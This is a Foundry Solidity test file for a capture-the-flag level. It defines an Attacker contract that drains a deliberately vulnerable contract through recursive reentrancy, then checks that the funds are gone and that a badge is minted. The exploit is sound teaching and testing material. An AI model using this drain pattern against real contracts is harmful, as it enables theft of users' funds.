// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {CTFFactory} from "../src/CTFFactory.sol";
import {Level1_Reentrancy} from "../src/Level1_Reentrancy.sol";

// Malicious contract that executes the recursive reentrancy exploit
contract Attacker {
    Level1_Reentrancy public target;

    constructor(address _target) {
        target = Level1_Reentrancy(_target);
    }

    function attack() external payable {
        target.donate{value: msg.value}(address(this));
        target.withdraw();
    }

    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw();
        }
    }
}

contract CTFTest is Test {
    CTFFactory public factory;
    address public player = address(0x1234);

    function setUp() public {
        factory = new CTFFactory();
        vm.deal(player, 1 ether);
    }

    function test_ReentrancyExploitAndValidation() public {
        vm.startPrank(player);

        // 1. Deploy Level 1 instance ( funded with 0.01 ETH )
        address instanceAddr = factory.deployLevel1{value: 0.01 ether}();
        assertEq(instanceAddr.balance, 0.01 ether, "Instance not funded");

        // 2. Deploy Attacker contract and execute exploit
        Attacker attacker = new Attacker(instanceAddr);
        attacker.attack{value: 0.001 ether}();

        // 3. Verify target contract has been drained to 0
        assertEq(instanceAddr.balance, 0, "Target contract not drained");

        // 4. Validate hack on the Factory to claim Soulbound Badge
        factory.validateLevel1();

        // 5. Assert that the player now owns Soulbound Badge #1
        uint256 badgeBalance = factory.badgeContract().balanceOf(player, 1);
        assertEq(badgeBalance, 1, "Soulbound Badge not minted");

        vm.stopPrank();
    }
}